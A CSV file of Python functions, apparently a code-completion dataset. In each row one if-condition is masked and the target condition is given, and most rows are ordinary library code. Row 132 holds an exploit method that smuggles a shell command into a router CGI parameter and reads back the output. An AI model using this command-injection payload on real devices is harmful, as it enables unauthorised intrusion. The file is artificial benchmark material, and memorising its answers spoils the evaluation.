117,"def _validate_command_chain(self) -> None:<tab>""""""Validate command-chain names.""""""<tab># Would normally get caught/handled by schema validation.<tab>for command in self.command_chain:<tab><tab><IF-STMT><tab><tab><tab>raise HookValidationError(<tab><tab><tab><tab>hook_name=self.hook_name,<tab><tab><tab><tab>message=f""{command!r} is not a valid command-chain command."",<tab><tab><tab>)","if not re . match ( ""^[A-Za-z0-9/._#:$-]*$"" , command ) :",124
118,"def _handle_unpaired_tag(self, html_tag):<tab>self.handle_ignore(html_tag, is_open=False)<tab>jannotations = self.read_jannotations(html_tag)<tab>for jannotation in arg_to_iter(jannotations):<tab><tab><IF-STMT><tab><tab><tab>self._close_unpaired_tag()<tab><tab>self.extra_required_attrs.extend(jannotation.pop(""required"", []))<tab><tab>annotation = self.build_annotation(jannotation)<tab><tab>self.handle_variant(annotation, is_open=False)<tab><tab>self.annotations.append(annotation)<tab>self.next_tag_index += 1",if self . unpairedtag_stack :,164
119,"def browser(self):<tab>if not hasattr(self, ""_browser""):<tab><tab>self.loop = asyncio.get_event_loop()<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>""Cannot use HTMLSession within an existing event loop. Use AsyncHTMLSession instead.""<tab><tab><tab>)<tab><tab>self._browser = self.loop.run_until_complete(super().browser)<tab>return self._browser",if self . loop . is_running ( ) :,105
120,"def process(self, node):<tab>self.vars = []<tab>for child in node.childNodes:<tab><tab>if child.nodeType == node.ELEMENT_NODE:<tab><tab><tab>child_text = get_xml_text(child)<tab><tab><tab><IF-STMT>  # pragma:nocover<tab><tab><tab><tab>continue<tab><tab><tab>if child.nodeName == ""Real"":<tab><tab><tab><tab>for val in re.split(""[\t ]+"", child_text):<tab><tab><tab><tab><tab>self.vars.append(1.0 * eval(val))<tab>return self","if child_text == """" :",135
121,"def instantiate(self, node, container=None):<tab>var = self.vm.program.NewVariable()<tab>if container and (<tab><tab>not isinstance(container, SimpleValue)<tab><tab>or self.full_name in container.all_template_names<tab>):<tab><tab>instance = TypeParameterInstance(self, container, self.vm)<tab><tab>return instance.to_variable(node)<tab>else:<tab><tab>for c in self.constraints:<tab><tab><tab>var.PasteVariable(c.instantiate(node, container))<tab><tab><IF-STMT><tab><tab><tab>var.PasteVariable(self.bound.instantiate(node, container))<tab>if not var.bindings:<tab><tab>var.AddBinding(self.vm.convert.unsolvable, [], node)<tab>return var",if self . bound :,184
122,"def compare_tables(self, db1, db2):<tab>i1 = db1.query(""SELECT id, buf FROM test ORDER BY id"")<tab>i2 = db2.query(""SELECT id, buf FROM test ORDER BY id"")<tab>for (id1, buf1) in i1:<tab><tab>(id2, buf2) = next(i2)<tab><tab>self.assertEqual(id1, id2)<tab><tab><IF-STMT><tab><tab><tab>self.assertAlmostEqual(buf1, buf2, places=9)<tab><tab>else:<tab><tab><tab>self.assertEqual(buf1, buf2)<tab>self.assertRaises(StopIteration, i2.__next__)","if isinstance ( buf1 , float ) :",158
123,"def list_full_file_paths(directory):<tab>""""""List the absolute paths of files in |directory|.""""""<tab>directory_absolute_path = os.path.abspath(directory)<tab>paths = []<tab>for relative_path in os.listdir(directory):<tab><tab>absolute_path = os.path.join(directory_absolute_path, relative_path)<tab><tab><IF-STMT>  # Only return paths to files.<tab><tab><tab>paths.append(absolute_path)<tab>return paths",if os . path . isfile ( absolute_path ) :,121
124,"def reparentChildren(self, newParent):<tab>while self.element.contents:<tab><tab>child = self.element.contents[0]<tab><tab>child.extract()<tab><tab><IF-STMT><tab><tab><tab>newParent.appendChild(Element(child, self.soup, namespaces[""html""]))<tab><tab>else:<tab><tab><tab>newParent.appendChild(TextNode(child, self.soup))","if isinstance ( child , Tag ) :",94
125,"def sort(self):<tab>sorted_models = []<tab>concrete_models = set()<tab>models = list(self.data)<tab>while len(sorted_models) < len(models):<tab><tab>found = False<tab><tab>for model in models:<tab><tab><tab>if model in sorted_models:<tab><tab><tab><tab>continue<tab><tab><tab>dependencies = self.dependencies.get(model._meta.concrete_model)<tab><tab><tab>if not (dependencies and dependencies.difference(concrete_models)):<tab><tab><tab><tab>sorted_models.append(model)<tab><tab><tab><tab>concrete_models.add(model._meta.concrete_model)<tab><tab><tab><tab>found = True<tab><tab><IF-STMT><tab><tab><tab>return<tab>self.data = OrderedDict((model, self.data[model]) for model in sorted_models)",if not found :,188
126,"def template(self):<tab>""""""template property""""""<tab>if self._template is None:<tab><tab>results = self._process(self.name, False, self.params, self.data)<tab><tab><IF-STMT><tab><tab><tab>raise OpenShiftCLIError(<tab><tab><tab><tab>""Error processing template [%s]: %s"" % (self.name, results)<tab><tab><tab>)<tab><tab>self._template = results[""results""][""items""]<tab>return self._template","if results [ ""returncode"" ] != 0 :",109
127,"def edit_file(self, filename):<tab>import subprocess<tab>editor = self.get_editor()<tab>if self.env:<tab><tab>environ = os.environ.copy()<tab><tab>environ.update(self.env)<tab>else:<tab><tab>environ = None<tab>try:<tab><tab>c = subprocess.Popen('%s ""%s""' % (editor, filename), env=environ, shell=True)<tab><tab>exit_code = c.wait()<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""%s: Editing failed!"" % editor)<tab>except OSError as e:<tab><tab>raise Exception(""%s: Editing failed: %s"" % (editor, e))",if exit_code != 0 :,157
128,"def test01e_json(self):<tab>""Testing GeoJSON input/output.""<tab>from django.contrib.gis.gdal.prototypes.geom import GEOJSON<tab>if not GEOJSON:<tab><tab>return<tab>for g in self.geometries.json_geoms:<tab><tab>geom = OGRGeometry(g.wkt)<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(g.json, geom.json)<tab><tab><tab>self.assertEqual(g.json, geom.geojson)<tab><tab>self.assertEqual(OGRGeometry(g.wkt), OGRGeometry(geom.json))","if not hasattr ( g , ""not_equal"" ) :",154
129,"def debug(self):<tab>feed_dict = self.get_test_feed_dict()<tab>while True:<tab><tab>tensor_name = input(""Input debug tensor name: "").strip()<tab><tab><IF-STMT><tab><tab><tab>sys.exit(0)<tab><tab>try:<tab><tab><tab>debug_tensor = self.graph.get_tensor_by_name(tensor_name)<tab><tab>except Exception as e:<tab><tab><tab>logging.error(e)<tab><tab><tab>continue<tab><tab>res = self.sess.run(debug_tensor, feed_dict=feed_dict)<tab><tab>logging.info(f""Result for tensor {tensor_name} is: {res}"")","if tensor_name == ""q"" :",162
130,"def get_location(self, dist, dependency_links):<tab>for url in dependency_links:<tab><tab>egg_fragment = Link(url).egg_fragment<tab><tab>if not egg_fragment:<tab><tab><tab>continue<tab><tab>if ""-"" in egg_fragment:<tab><tab><tab>## FIXME: will this work when a package has - in the name?<tab><tab><tab>key = ""-"".join(egg_fragment.split(""-"")[:-1]).lower()<tab><tab>else:<tab><tab><tab>key = egg_fragment<tab><tab><IF-STMT><tab><tab><tab>return url.split(""#"", 1)[0]<tab>return None",if key == dist . key :,141
131,"def select(result):<tab>for elem in result:<tab><tab>parent = elem.getparent()<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>try:<tab><tab><tab># FIXME: what if the selector is ""*"" ?<tab><tab><tab>elems = list(parent.iterchildren(elem.tag))<tab><tab><tab>if elems[index] is elem:<tab><tab><tab><tab>yield elem<tab><tab>except IndexError:<tab><tab><tab>pass",if parent is None :,101
132,"def execute(self, cmd):<tab>mark = utils.random_text(32)<tab>path = ""/cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;{};echo {};"".format(cmd, mark)<tab>response = self.http_request(<tab><tab>method=""GET"",<tab><tab>path=path,<tab>)<tab>if response is None:<tab><tab>return """"<tab>if mark in response.text:<tab><tab>regexp = ""(|.+?){}"".format(mark)<tab><tab>res = re.findall(regexp, response.text, re.DOTALL)<tab><tab><IF-STMT><tab><tab><tab>return res[0]<tab>return """"",if len ( res ) :,155
133,"def join(s, *p):<tab>path = s<tab>for t in p:<tab><tab>if (not s) or isabs(t):<tab><tab><tab>path = t<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>t = t[1:]<tab><tab>if "":"" not in path:<tab><tab><tab>path = "":"" + path<tab><tab>if path[-1:] != "":"":<tab><tab><tab>path = path + "":""<tab><tab>path = path + t<tab>return path","if t [ : 1 ] == "":"" :",115
134,"def do_remove(self):<tab>if self.netconf.locked(""dhcp""):<tab><tab>if not self.pid:<tab><tab><tab>pid = read_pid_file(""/var/run/udhcpd.pan1.pid"")<tab><tab>else:<tab><tab><tab>pid = self.pid<tab><tab><IF-STMT><tab><tab><tab>logging.info(""Stale dhcp lockfile found"")<tab><tab>self.netconf.unlock(""dhcp"")","if not kill ( pid , ""udhcpd"" ) :",110
135,"def filter_packages(query, package_infos):<tab>if query is None:<tab><tab>return package_infos<tab>try:<tab><tab>if ""!"" in query:<tab><tab><tab>raise ConanException(""'!' character is not allowed"")<tab><tab>if "" not "" in query or query.startswith(""not ""):<tab><tab><tab>raise ConanException(""'not' operator is not allowed"")<tab><tab>postfix = infix_to_postfix(query) if query else []<tab><tab>result = OrderedDict()<tab><tab>for package_id, info in package_infos.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result[package_id] = info<tab><tab>return result<tab>except Exception as exc:<tab><tab>raise ConanException(""Invalid package query: %s. %s"" % (query, exc))","if _evaluate_postfix_with_info ( postfix , info ) :",193
136,"def __add__(self, other):<tab>if isinstance(other, Vector3):<tab><tab># Vector + Vector -> Vector<tab><tab># Vector + Point -> Point<tab><tab># Point + Point -> Vector<tab><tab><IF-STMT><tab><tab><tab>_class = Vector3<tab><tab>else:<tab><tab><tab>_class = Point3<tab><tab>return _class(self.x + other.x, self.y + other.y, self.z + other.z)<tab>else:<tab><tab>assert hasattr(other, ""__len__"") and len(other) == 3<tab><tab>return Vector3(self.x + other[0], self.y + other[1], self.z + other[2])",if self . __class__ is other . __class__ :,166
137,"def test_scout():<tab>test_status = False<tab>with open(""/tmp/test_scout_output"", ""w"") as logfile:<tab><tab>if not DockerImage:<tab><tab><tab>logfile.write(""No $AMBASSADOR_DOCKER_IMAGE??\n"")<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if wait_for_diagd(logfile) and check_chimes(logfile):<tab><tab><tab><tab><tab>test_status = True<tab><tab><tab><tab>docker_kill(logfile)<tab>if not test_status:<tab><tab>with open(""/tmp/test_scout_output"", ""r"") as logfile:<tab><tab><tab>for line in logfile:<tab><tab><tab><tab>print(line.rstrip())<tab>assert test_status, ""test failed""",if docker_start ( logfile ) :,189
138,"def visit_Assign(self, node):<tab>""""""Handle visiting an assignment statement.""""""<tab>ups = set()<tab>for targ in node.targets:<tab><tab>if isinstance(targ, (Tuple, List)):<tab><tab><tab>ups.update(leftmostname(elt) for elt in targ.elts)<tab><tab><IF-STMT><tab><tab><tab>newnode = self.try_subproc_toks(node)<tab><tab><tab>if newnode is node:<tab><tab><tab><tab>ups.add(leftmostname(targ))<tab><tab><tab>else:<tab><tab><tab><tab>return newnode<tab><tab>else:<tab><tab><tab>ups.add(leftmostname(targ))<tab>self.ctxupdate(ups)<tab>return node","elif isinstance ( targ , BinOp ) :",165
139,"def get_config_h_filename():<tab>""""""Returns the path of pyconfig.h.""""""<tab>if _PYTHON_BUILD:<tab><tab># The additional check for != ""java"" secures against JyNI-monkeypatching.<tab><tab><IF-STMT><tab><tab><tab>inc_dir = os.path.join(_PROJECT_BASE, ""PC"")<tab><tab>else:<tab><tab><tab>inc_dir = _PROJECT_BASE<tab>else:<tab><tab>inc_dir = get_path(""platinclude"")<tab>return os.path.join(inc_dir, ""pyconfig.h"")","if os . name == ""nt"" and os . name != ""java"" :",148
140,"def is_valid_block(self):<tab>""""""check wheter the block is valid in the current position""""""<tab>for i in range(self.block.x):<tab><tab>for j in range(self.block.x):<tab><tab><tab>if self.block.get(i, j):<tab><tab><tab><tab>if self.block.pos.x + i < 0:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.block.pos.y + j < 0:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.map.get((self.block.pos.x + i, self.block.pos.y + j), False):<tab><tab><tab><tab><tab>return False<tab>return True",if self . block . pos . x + i >= COLUMNS :,192
141,"def __call__(self, execution_result):<tab>json_value = execution_result.get_output_in_json()<tab>actual_result = jmespath.search(<tab><tab>self._query, json_value, jmespath.Options(collections.OrderedDict)<tab>)<tab>if not actual_result > self._expected_result:<tab><tab>expected_result_format = ""> {}"".format(self._expected_result)<tab><tab><IF-STMT><tab><tab><tab>raise JMESPathCheckAssertionError(<tab><tab><tab><tab>self._query,<tab><tab><tab><tab>expected_result_format,<tab><tab><tab><tab>actual_result,<tab><tab><tab><tab>execution_result.output,<tab><tab><tab>)<tab><tab>raise JMESPathCheckAssertionError(<tab><tab><tab>self._query, expected_result_format, ""None"", execution_result.output<tab><tab>)",if actual_result :,194
142,def readline(b):<tab>a = 1<tab>while True:<tab><tab>if b:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>a = 2<tab><tab><tab><tab>b = None<tab><tab><tab><tab>continue<tab><tab>b = None<tab><tab>a = 5<tab><tab>return a,if b [ 0 ] :,70
143,"def test_execute_magic(self):<tab>""""""execute accepts IPython commands""""""<tab>view = self.client[:]<tab>view.execute(""a = 5"")<tab>ar = view.execute(""%whos"", block=True)<tab># this will raise, if that failed<tab>ar.get(5)<tab>for stdout in ar.stdout:<tab><tab>lines = stdout.splitlines()<tab><tab>self.assertEqual(lines[0].split(), [""Variable"", ""Type"", ""Data/Info""])<tab><tab>found = False<tab><tab>for line in lines[2:]:<tab><tab><tab>split = line.split()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>found = True<tab><tab><tab><tab>break<tab><tab>self.assertTrue(found, ""whos output wrong: %s"" % stdout)","if split == [ ""a"" , ""int"" , ""5"" ] :",188
144,"def imgFileProcessingTick(output):<tab>if isinstance(output, tuple):<tab><tab>workerOutput.append(output)<tab><tab>workerPool.terminate()<tab>else:<tab><tab>for page in output:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>options.imgMetadata[page[0]] = page[1]<tab><tab><tab><tab>options.imgOld.append(page[2])<tab>if GUI:<tab><tab>GUI.progressBarTick.emit(""tick"")<tab><tab>if not GUI.conversionAlive:<tab><tab><tab>workerPool.terminate()",if page is not None :,129
145,"def _load(xs):<tab>ret = []<tab>for x, ctx in zip(xs, context):<tab><tab><IF-STMT><tab><tab><tab>ret.append([y.as_in_context(ctx) for y in x])<tab><tab>else:<tab><tab><tab>ret.append(x.as_in_context(ctx))<tab>return ret","if isinstance ( x , tuple ) :",85
146,"def _is_64bit_os():<tab>global _IS_64BIT_OS<tab>if _IS_64BIT_OS is None:<tab><tab><IF-STMT><tab><tab><tab>import platform<tab><tab><tab>_IS_64BIT_OS = platform.machine() == ""AMD64""<tab><tab>else:<tab><tab><tab>_IS_64BIT_OS = False<tab>return _IS_64BIT_OS",if sys . maxsize > 2 ** 32 :,101
147,"def stepStarted(self, step):<tab>self.currentStep = step<tab>for w in self.watchers:<tab><tab>receiver = w.stepStarted(self, step)<tab><tab>if receiver:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>step.subscribe(receiver[0], receiver[1])<tab><tab><tab>else:<tab><tab><tab><tab>step.subscribe(receiver)<tab><tab><tab>d = step.waitUntilFinished()<tab><tab><tab># TODO: This actually looks like a bug, but this code<tab><tab><tab># will be removed anyway.<tab><tab><tab># pylint: disable=cell-var-from-loop<tab><tab><tab>d.addCallback(lambda step: step.unsubscribe(receiver))<tab>step.waitUntilFinished().addCallback(self._stepFinished)","if isinstance ( receiver , type ( ( ) ) ) :",183
148,"def connection(self, commit_on_success=False):<tab>with self._lock:<tab><tab>if self._bulk_commit:<tab><tab><tab>if self._pending_connection is None:<tab><tab><tab><tab>self._pending_connection = sqlite.connect(self.filename)<tab><tab><tab>con = self._pending_connection<tab><tab>else:<tab><tab><tab>con = sqlite.connect(self.filename)<tab><tab>try:<tab><tab><tab>if self.fast_save:<tab><tab><tab><tab>con.execute(""PRAGMA synchronous = 0;"")<tab><tab><tab>yield con<tab><tab><tab><IF-STMT><tab><tab><tab><tab>con.commit()<tab><tab>finally:<tab><tab><tab>if not self._bulk_commit:<tab><tab><tab><tab>con.close()",if commit_on_success and self . can_commit :,182
149,"def parse_response(self, response):<tab># read response data from httpresponse, and parse it<tab># Check for new http response object, otherwise it is a file object.<tab>if hasattr(response, ""getheader""):<tab><tab>if response.getheader(""Content-Encoding"", """") == ""gzip"":<tab><tab><tab>stream = GzipDecodedResponse(response)<tab><tab>else:<tab><tab><tab>stream = response<tab>else:<tab><tab>stream = response<tab>p, u = self.getparser()<tab>while 1:<tab><tab>data = stream.read(1024)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>if self.verbose:<tab><tab><tab>print(""body:"", repr(data))<tab><tab>p.feed(data)<tab>if stream is not response:<tab><tab>stream.close()<tab>p.close()<tab>return u.close()",if not data :,199
150,"def edge2str(self, nfrom, nto):<tab>if isinstance(nfrom, ExprCompose):<tab><tab>for i in nfrom.args:<tab><tab><tab>if i[0] == nto:<tab><tab><tab><tab>return ""[%s, %s]"" % (i[1], i[2])<tab>elif isinstance(nfrom, ExprCond):<tab><tab><IF-STMT><tab><tab><tab>return ""?""<tab><tab>elif nfrom.src1 == nto:<tab><tab><tab>return ""True""<tab><tab>elif nfrom.src2 == nto:<tab><tab><tab>return ""False""<tab>return """"",if nfrom . cond == nto :,149
151,"def gather_command_line_options(filter_disabled=None):<tab>""""""Get a sorted list of all CommandLineOption subclasses.""""""<tab>if filter_disabled is None:<tab><tab>filter_disabled = not SETTINGS.COMMAND_LINE.SHOW_DISABLED_OPTIONS<tab>options = []<tab>for opt in get_inheritors(commandline_options.CommandLineOption):<tab><tab>warnings.warn(<tab><tab><tab>""Subclassing `CommandLineOption` is deprecated. Please ""<tab><tab><tab>""use the `sacred.cli_option` decorator and pass the function ""<tab><tab><tab>""to the Experiment constructor.""<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>options.append(opt)<tab>options += DEFAULT_COMMAND_LINE_OPTIONS<tab>return sorted(options, key=commandline_options.get_name)",if filter_disabled and not opt . _enabled :,199
152,"def handle_disconnect(self):<tab>""""""Socket gets disconnected""""""<tab># signal disconnected terminal with control lines<tab>try:<tab><tab>self.serial.rts = False<tab><tab>self.serial.dtr = False<tab>finally:<tab><tab># restore original port configuration in case it was changed<tab><tab>self.serial.apply_settings(self.serial_settings_backup)<tab><tab># stop RFC 2217 state machine<tab><tab>self.rfc2217 = None<tab><tab># clear send buffer<tab><tab>self.buffer_ser2net = bytearray()<tab><tab># close network connection<tab><tab>if self.socket is not None:<tab><tab><tab>self.socket.close()<tab><tab><tab>self.socket = None<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.log.warning(""{}: Disconnected"".format(self.device))",if self . log is not None :,195
153,"def answers(self, other):<tab>if not isinstance(other, TCP):<tab><tab>return 0<tab>if conf.checkIPsrc:<tab><tab>if not ((self.sport == other.sport) and (self.dport == other.dport)):<tab><tab><tab>return 0<tab>if conf.check_TCPerror_seqack:<tab><tab>if self.seq is not None:<tab><tab><tab>if self.seq != other.seq:<tab><tab><tab><tab>return 0<tab><tab><IF-STMT><tab><tab><tab>if self.ack != other.ack:<tab><tab><tab><tab>return 0<tab>return 1",if self . ack is not None :,143
154,"def _override_options(options, **overrides):<tab>""""""Override options.""""""<tab>for opt, val in overrides.items():<tab><tab>passed_value = getattr(options, opt, _Default())<tab><tab><IF-STMT><tab><tab><tab>value = process_value(opt, passed_value.value)<tab><tab><tab>value += process_value(opt, val)<tab><tab><tab>setattr(options, opt, value)<tab><tab>elif isinstance(passed_value, _Default):<tab><tab><tab>setattr(options, opt, process_value(opt, val))","if opt in ( ""ignore"" , ""select"" ) and passed_value :",137
155,"def _unlock_restarted_vms(self, pool_name):<tab>result = []<tab>for vm in await self.middleware.call(""vm.query"", [(""autostart"", ""="", True)]):<tab><tab>for device in vm[""devices""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>path = device[""attributes""].get(""path"")<tab><tab><tab>if not path:<tab><tab><tab><tab>continue<tab><tab><tab>if path.startswith(f""/dev/zvol/{pool_name}/"") or path.startswith(<tab><tab><tab><tab>f""/mnt/{pool_name}/""<tab><tab><tab>):<tab><tab><tab><tab>result.append(vm)<tab><tab><tab><tab>break<tab>return result","if device [ ""dtype"" ] not in ( ""DISK"" , ""RAW"" ) :",172
156,"def check_space(arr, task_id):<tab>for a in arr:<tab><tab><IF-STMT><tab><tab><tab>found = False<tab><tab><tab>for x in shlex.split(a):<tab><tab><tab><tab>if task_id in x:<tab><tab><tab><tab><tab>found = True<tab><tab><tab>if not found:<tab><tab><tab><tab>raise AssertionError","if a . startswith ( ""hadoop jar"" ) :",86
157,"def clean(self):<tab>if self.instance:<tab><tab>redirect_to = self.data.get(""redirect_to"", """")<tab><tab>if redirect_to != """":<tab><tab><tab>lfs.core.utils.set_redirect_for(<tab><tab><tab><tab>self.instance.get_absolute_url(), redirect_to<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>lfs.core.utils.remove_redirect_for(self.instance.get_absolute_url())<tab>if self.data.get(""active_base_price"") == str(CHOICES_YES):<tab><tab><IF-STMT><tab><tab><tab>self.errors[""base_price_amount""] = ErrorList(<tab><tab><tab><tab>[_(u""This field is required."")]<tab><tab><tab>)<tab>return self.cleaned_data","if self . data . get ( ""base_price_amount"" , """" ) == """" :",197
158,"def detect(get_page):<tab>retval = False<tab>for vector in WAF_ATTACK_VECTORS:<tab><tab>page, headers, code = get_page(get=vector)<tab><tab>retval = (<tab><tab><tab>re.search(<tab><tab><tab><tab>r""\AAL[_-]?(SESS|LB)="", headers.get(HTTP_HEADER.SET_COOKIE, """"), re.I<tab><tab><tab>)<tab><tab><tab>is not None<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>break<tab>return retval",if retval :,127
159,"def unloadOnePlugin(self, moduleOrFileName, verbose=False):<tab>moduleName = self.regularizeName(moduleOrFileName)<tab>if self.isLoaded(moduleName):<tab><tab><IF-STMT><tab><tab><tab>g.pr(""unloading"", moduleName)<tab><tab>del self.loadedModules[moduleName]<tab>for tag in self.handlers:<tab><tab>bunches = self.handlers.get(tag)<tab><tab>bunches = [bunch for bunch in bunches if bunch.moduleName != moduleName]<tab><tab>self.handlers[tag] = bunches",if verbose :,136
160,"def __init__(self, **kw):<tab>util_schema.validate(<tab><tab>instance=kw,<tab><tab>schema=self.schema,<tab><tab>cls=util_schema.CustomValidator,<tab><tab>use_default=False,<tab><tab>allow_default_none=True,<tab>)<tab>for prop in six.iterkeys(self.schema.get(""properties"", [])):<tab><tab>value = kw.get(prop, None)<tab><tab># special handling for chain property to create the Node object<tab><tab><IF-STMT><tab><tab><tab>nodes = []<tab><tab><tab>for node in value:<tab><tab><tab><tab>ac_node = Node(**node)<tab><tab><tab><tab>ac_node.validate()<tab><tab><tab><tab>nodes.append(ac_node)<tab><tab><tab>value = nodes<tab><tab>setattr(self, prop, value)","if prop == ""chain"" :",195
161,"def initialize(self):<tab>for document in self.corpus:<tab><tab>frequencies = {}<tab><tab>for word in document:<tab><tab><tab>if word not in frequencies:<tab><tab><tab><tab>frequencies[word] = 0<tab><tab><tab>frequencies[word] += 1<tab><tab>self.f.append(frequencies)<tab><tab>for word, freq in iteritems(frequencies):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.df[word] = 0<tab><tab><tab>self.df[word] += 1<tab>for word, freq in iteritems(self.df):<tab><tab>self.idf[word] = math.log(self.corpus_size - freq + 0.5) - math.log(freq + 0.5)",if word not in self . df :,170
162,"def get_child(self, name):<tab>if self.isdir:<tab><tab>try:<tab><tab><tab>return self.data[name]<tab><tab>except:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>for childname, child in list(self.data.items()):<tab><tab><tab><tab><tab>if childname.lower() == name.lower():<tab><tab><tab><tab><tab><tab>return child<tab><tab><tab>raise",if not self . case_sensitive :,100
163,"def set_cover(channel, pixbuf):<tab>if self.channel == channel:<tab><tab><IF-STMT><tab><tab><tab>self.imgCover.set_from_pixbuf(self.scale_pixbuf(pixbuf))<tab><tab>if self.show_on_cover_load:<tab><tab><tab>self.main_window.show()<tab><tab><tab>self.show_on_cover_load = False",if pixbuf is not None :,97
164,"def test_infer_shape_matrix(self):<tab># Testing the infer_shape with a matrix.<tab>x = theano.tensor.matrix()<tab>for op in self.ops:<tab><tab>if not op.return_inverse:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>f = op(x)[2]<tab><tab>else:<tab><tab><tab>f = op(x)[1]<tab><tab>self._compile_and_check(<tab><tab><tab>[x],<tab><tab><tab>[f],<tab><tab><tab>[np.asarray(np.array([[2, 1], [3, 2], [2, 3]]), dtype=config.floatX)],<tab><tab><tab>self.op_class,<tab><tab>)",if op . return_index :,170
165,"def Filter(self, match=None, **_):<tab>""""""Filter the current expression.""""""<tab>arg = self.stack.pop(-1)<tab># Filters can be specified as a comma separated list.<tab>for filter_name in match.group(1).split("",""):<tab><tab>filter_object = ConfigFilter.classes_by_name.get(filter_name)<tab><tab>if filter_object is None:<tab><tab><tab>raise FilterError(""Unknown filter function %r"" % filter_name)<tab><tab><IF-STMT><tab><tab><tab>logging.debug(""Applying filter %s for %s."", filter_name, arg)<tab><tab>arg = filter_object().Filter(arg)<tab><tab>precondition.AssertType(arg, Text)<tab>self.stack[-1] += arg",if not filter_object . sensitive_arg :,180
166,"def enqueue_link(self, fuzzresult, link_url, parsed_link):<tab># dir path<tab>if self.add_path:<tab><tab>split_path = parsed_link.path.split(""/"")<tab><tab>newpath = ""/"".join(split_path[:-1]) + ""/""<tab><tab>self.queue_url(urljoin(fuzzresult.url, newpath))<tab># file path<tab>new_link = urljoin(fuzzresult.url, link_url)<tab>if not self.regex_param or (<tab><tab>self.regex_param and self.regex_param.search(new_link) is not None<tab>):<tab><tab><IF-STMT><tab><tab><tab>self.queue_url(new_link)<tab><tab>self.add_result(""link"", ""New link found"", new_link)",if self . enqueue_links :,188
167,"def old_save(self, *args, **kwargs):<tab>""Override save to set Subscribers and send Notifications""<tab>original = None<tab>original_assigned = []<tab>if hasattr(self, ""instance""):<tab><tab>try:<tab><tab><tab>original = Task.objects.get(pk=self.instance.id)<tab><tab><tab>original_assigned = list(original.assigned.all())<tab><tab>except Task.DoesNotExist:<tab><tab><tab>pass<tab>instance = super(TaskForm, self).save(*args, **kwargs)<tab>if original:<tab><tab>new_assigned = list(self.cleaned_data[""assigned""])<tab><tab><IF-STMT><tab><tab><tab>for assignee in new_assigned:<tab><tab><tab><tab>self.instance.subscribers.add(assignee)<tab>return instance",if original_assigned != new_assigned :,189
168,"def get_test_layer():<tab>layers = get_bb_var(""BBLAYERS"").split()<tab>testlayer = None<tab>for l in layers:<tab><tab>if ""~"" in l:<tab><tab><tab>l = os.path.expanduser(l)<tab><tab><IF-STMT><tab><tab><tab>testlayer = l<tab><tab><tab>break<tab>return testlayer","if ""/meta-selftest"" in l and os . path . isdir ( l ) :",98
169,"def readable(request):<tab>""""""Display a readable version of this url if we can""""""<tab>rdict = request.matchdict<tab>bid = rdict.get(""hash_id"", None)<tab>username = rdict.get(""username"", None)<tab>if bid:<tab><tab>found = BmarkMgr.get_by_hash(bid, username=username)<tab><tab><IF-STMT><tab><tab><tab>return {<tab><tab><tab><tab>""bmark"": found,<tab><tab><tab><tab>""username"": username,<tab><tab><tab>}<tab><tab>else:<tab><tab><tab>return HTTPNotFound()",if found :,136
170,"def pythonpath(conanfile):<tab>python_path = conanfile.env.get(""PYTHONPATH"", None)<tab>if python_path:<tab><tab>old_path = sys.path[:]<tab><tab><IF-STMT><tab><tab><tab>sys.path.extend(python_path)<tab><tab>else:<tab><tab><tab>sys.path.append(python_path)<tab><tab>yield<tab><tab>sys.path = old_path<tab>else:<tab><tab>yield","if isinstance ( python_path , list ) :",112
171,"def _validate(self):<tab>on_target_delete = None<tab>for cmd in self.val.commands:<tab><tab>if isinstance(cmd, qlast.OnTargetDelete):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise errors.EdgeQLSyntaxError(<tab><tab><tab><tab><tab>f""more than one 'on target delete' specification"",<tab><tab><tab><tab><tab>context=cmd.context,<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>on_target_delete = cmd",if on_target_delete :,119
172,"def _choose_instance(self, timeout_time):<tab>""""""Returns an Instance to handle a request or None if all are busy.""""""<tab>with self._condition:<tab><tab>while time.time() < timeout_time and not self._quit_event.is_set():<tab><tab><tab>for inst in self._instances:<tab><tab><tab><tab>if inst.can_accept_requests:<tab><tab><tab><tab><tab>return inst<tab><tab><tab>else:<tab><tab><tab><tab>inst = self._start_any_instance()<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab><tab><tab><tab>self._condition.wait(timeout_time - time.time())<tab><tab>else:<tab><tab><tab>return None<tab>if inst:<tab><tab>inst.wait(timeout_time)<tab>return inst",if inst :,180
173,"def get_identifiers(self):<tab>ids = []<tab>for entry in glob.glob(f""{self._base_path}/ctl-*""):<tab><tab>ident = entry.split(""-"", 1)[-1]<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if os.path.exists(os.path.join(entry, ""disk_octets.rrd"")):<tab><tab><tab>ids.append(ident)<tab>ids.sort(key=RRDBase._sort_ports)<tab>return ids","if ident . endswith ( ""ioctl"" ) :",118
